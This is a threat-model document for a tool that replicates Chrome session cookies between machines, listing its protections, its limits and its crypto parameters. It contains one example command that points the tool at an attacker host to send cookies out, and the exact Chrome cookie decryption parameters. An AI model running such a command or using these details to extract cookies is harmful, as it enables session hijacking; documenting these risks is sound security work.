# cookinc threat model

## What cookinc does

Continuously replicates Chrome session cookies from a Windows machine (source)
to a Linux machine (sink), with opt-in domain allowlists on the source and
optional blocklists on the sink. Replication is one-way, encrypted end-to-end
with AES-256-GCM, and authenticated with a shared secret or pair-derived key.

## Trust model

cookinc trusts:

- The OS on both machines, including the kernel, user account boundary, and file permissions.
- Chrome's process security — cookies are read from Chrome's own SQLite store using Chrome's own crypto.
- The user-chosen transport channel (HTTP, SSH, cloudflared). cookinc layers its own encryption on top, but the channel's availability and integrity are trusted.
- The user's filesystem under `~/.config/cookinc/`. Anyone with read access to config files can read the shared secret (plaintext in config.yaml in the basic setup).

## What cookinc protects against

- **Plaintext cookies in transit.** Every payload is AES-256-GCM sealed with a per-pair key. The key never appears unencrypted on the wire.
- **Plaintext cookies at rest on the sink.** Cookies in the Linux Chrome SQLite are re-encrypted with the local Chrome Safe Storage key before writing.
- **Wrong-secret / unauthenticated requests.** AEAD tag mismatch rejects the payload; the sink returns 401.
- **Replay of captured payloads.** The monotonic sequence number per source prevents replayed envelopes from being accepted (in-memory tracker; persisted in V2).
- **Source pushing cookies for unapproved domains.** The source allowlist is the primary gate: cookies for non-allowlisted domains are never sent. The sink blocklist is defense in depth.
- **Unauthorized sources.** A pre-shared secret or pairing-derived key gates access to the sink's `/sync` endpoint.
- **DoS via large bodies.** The sink enforces a 256 MB body cap via `http.MaxBytesReader`.

## What cookinc does NOT protect against

- **Root or Administrator on either machine.** Anyone with privileged access can read raw cookies from Chrome's SQLite + system key store. cookinc does not raise that bar.
- **Compromise of Chrome itself.** A malicious extension or exploit in Chrome can already read cookie plaintext. cookinc does not change that.
- **Compromise of the user's Windows account.** An attacker with code execution as the user can read the shared secret, cookies, and config.
- **Device-bound cookies (DBSC).** Chrome's Device Bound Session Credentials tie a session to one machine's hardware. A replicated cookie works only until its short-lived window expires. cookinc flags DBSC-suspect cookies and ships them with a warning. For Google sessions, sign the sink's Chrome into the same account instead.
- **Device fingerprint-based sessions.** Sites that bind sessions to canvas fingerprint, screen size, etc. will fail after replication.
- **Coercion of the user.** If someone makes you run `cookinc init --sink http://attacker/`, cookies will flow to them.

## Cryptographic specifics

| Layer | Algorithm | Details |
|-------|-----------|---------|
| Chrome at rest (Windows) | DPAPI | OS-managed, tied to user account |
| Chrome at rest (Linux) | AES-128-CBC | PBKDF2-SHA1, salt `saltysalt`, 1003 iterations, IV = 16 spaces, v10 prefix |
| Transport encryption | AES-256-GCM | Random 12-byte nonce per message, 32-byte key |
| Key derivation (shared secret) | SHA-256 | Input must be ≥ 32 bytes |
| Key derivation (pairing) | X25519 + HKDF-SHA256 | Planned for V2 |

## Versioning

- v1: Current wire format. Shared secret auth, AES-256-GCM, non-persistent sequence tracker.
- v2 (planned): Pairing-derived keys (X25519), persistent sequence tracker, optional session sealing at rest.
